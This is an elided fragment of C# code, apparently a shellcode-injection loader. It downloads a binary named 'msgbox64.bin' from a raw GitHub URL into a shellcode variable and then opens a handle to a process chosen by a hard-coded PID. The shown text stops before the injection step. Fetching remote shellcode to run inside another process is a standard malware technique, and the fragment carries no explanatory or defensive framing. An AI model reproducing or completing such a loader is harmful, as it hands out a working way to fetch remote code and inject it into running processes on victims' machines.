    ...
    internal class Program
    {
        static async Task Main(string[] args)
        {
            ...
            using (var handler = new HttpClientHandler())
            {
                ...
                {
                    shellcode = await client.GetByteArrayAsync("https://raw.githubusercontent.com/unknown-archive/shellcode/main/msgbox64.bin");
                }
            }

            // Open handle to process
            var process = Process.GetProcessById(8356);
